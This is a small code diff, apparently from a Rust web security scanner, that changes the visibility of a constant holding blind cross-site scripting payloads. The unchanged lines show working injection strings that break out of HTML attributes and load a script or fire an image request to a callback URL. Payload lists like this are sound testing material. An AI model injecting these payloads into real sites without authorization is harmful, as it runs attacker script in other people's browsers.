@@ -12,7 +12,7 @@
 /// executed, not merely that the tag rendered. `new Image()` (rather than
 /// re-assigning `this.src`) avoids an onerror loop when the callback response
 /// isn't a decodable image.
-pub const XSS_BLIND_PAYLOADS: &[&str] = &[
+pub(crate) const XSS_BLIND_PAYLOADS: &[&str] = &[
     "\"'><script src={}></script>",
     "-->\"'></script><script src={}></script>",
     "\"'><img src=x onerror=\"new Image().src='{}'\">",
